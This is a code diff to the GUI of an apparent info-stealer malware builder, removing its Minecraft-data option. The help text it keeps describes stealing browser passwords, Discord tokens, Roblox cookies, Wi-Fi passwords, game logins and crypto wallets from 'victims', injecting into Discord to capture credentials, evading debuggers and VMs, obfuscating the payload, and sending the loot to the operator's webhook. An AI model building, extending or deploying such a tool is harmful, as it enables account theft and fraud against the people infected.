@@ -49,7 +49,6 @@ class App(ctk.CTk):
             "roblox": False,
             "obfuscation": False,
             "injection": False,
-            "minecraft": False,
             "wifi": False,
             "antidebug_vm": False,
             "discord": False,
@@ -157,11 +156,6 @@ class App(ctk.CTk):
                                               fg_color="#5d11c3", hover_color="#5057eb")
         self.wifi.grid(row=1, column=0, sticky="ne", padx=130, pady=105)
 
-        self.minecraft = ctk.CTkCheckBox(
-            self.builder_frame, text="Minecraft Info", font=ctk.CTkFont(size=17, family=self.font),
-            fg_color="#5d11c3", hover_color="#5057eb")
-        self.minecraft.grid(row=1, column=0, sticky="ne", padx=99, pady=150)
-
         self.systeminfo = ctk.CTkCheckBox(
             self.builder_frame, text="System Info", font=ctk.CTkFont(size=17, family=self.font),
             fg_color="#5d11c3", hover_color="#5057eb")
@@ -241,7 +235,7 @@ class App(ctk.CTk):
         self.build.grid(row=1, column=0, sticky="ne", padx=85, pady=420)
         
         self.checkboxes = [self.ping, self.pingtype, self.error, self.startup, self.defender, self.systeminfo, self.backupcodes, self.browser, self.webcam,
-                           self.roblox, self.obfuscation, self.injection, self.minecraft, self.wifi, self.games, self.antidebug_vm, self.discord, self.clipboard,
+                           self.roblox, self.obfuscation, self.injection, self.wifi, self.games, self.antidebug_vm, self.discord, self.clipboard,
                            self.antispam, self.self_destruct, self.pump, self.wallets]
 
         # Frame 2
@@ -268,9 +262,8 @@ Browser Info:\nThis will get the user's browser such as browser passwords, histo
 Roblox Info:\nThis will get the user's roblox information like there username, roblox cookie and the amount of robux they have.\n\n
 Obfuscation:\nThis will obfuscate the file which means the source code will be unreadable and it will be hard for your victim's to delete or \nspam your webhook.\n\n
 Injection:\nThis will inject a script into your victim's discord which means when they change any credentials you will recieve their \npassword and token to that discord account.\n\n
-Minecraft Info:\nThis will get the user's minecraft information such as their session info and user cache.\n\n
 Wifi Info:\nThis will get the user's wifi information such as wifi passwords and wifi networks.\n\n
-Games:\nThis will currently steal Epic and minecraft logins.\n\n
+Games:\nThis will currently steal Epic and Minecraft logins.\n\n
 Anti-Debug VM:\nThis will check if the user is using a virtual machine or if they are debugging this script and it will exit out to stop them.\n\n
 Discord Info:\nThis will send you all the discord information for every account they have. This info consists of their email, phone number, if \nthey have 2fa enabled, if they have nitro and what type of nitro, token and any gift cards.\n\n
 Anti Spam:\nOnly allows the victim to open the file every 60 seconds so your webhook isnt rate limited or spammed.\n\n
@@ -407,7 +400,6 @@ Nuitka - Builds a standalone executable file with the necessary modules inside o
             "roblox": self.roblox,
             "obfuscation": self.obfuscation,
             "injection": self.injection,
-            "minecraft": self.minecraft,
             "wifi": self.wifi,
             "antidebug_vm": self.antidebug_vm,
             "discord": self.discord,
@@ -523,11 +515,6 @@ Nuitka - Builds a standalone executable file with the necessary modules inside o
                 
                 if self.updated_dictionary["injection"]:
                     with open(options+"Injection.py", "r", encoding="utf-8") as f:
-                        code += f.read()
-                        code += "\n\n"
-                
-                if self.updated_dictionary["minecraft"]:
-                    with open(options+"Minecraft.py", "r", encoding="utf-8") as f:
                         code += f.read()
                         code += "\n\n"
                 
